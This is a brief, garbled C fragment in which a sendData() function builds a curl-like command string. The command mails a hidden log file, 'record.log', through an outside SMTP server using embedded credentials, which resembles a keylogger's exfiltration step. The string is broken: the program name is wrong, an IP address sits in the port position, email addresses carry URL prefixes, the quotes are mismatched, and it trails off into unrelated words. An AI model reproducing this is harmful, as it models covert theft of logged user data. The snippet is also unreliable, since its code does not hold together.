...
void sendData(){
    ...
    char* command = "Transmit smtp://smtp.gmail.com:13.70.74.0-v --mail-from \"https://fadliwiryawirawannewmail@microsoft.com" --mail-rcpt \"https://fadliwiryawirawannewmail@microsoft.com" --ssl -u  https://fadliwiryawirawannewmail@microsoft.com :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
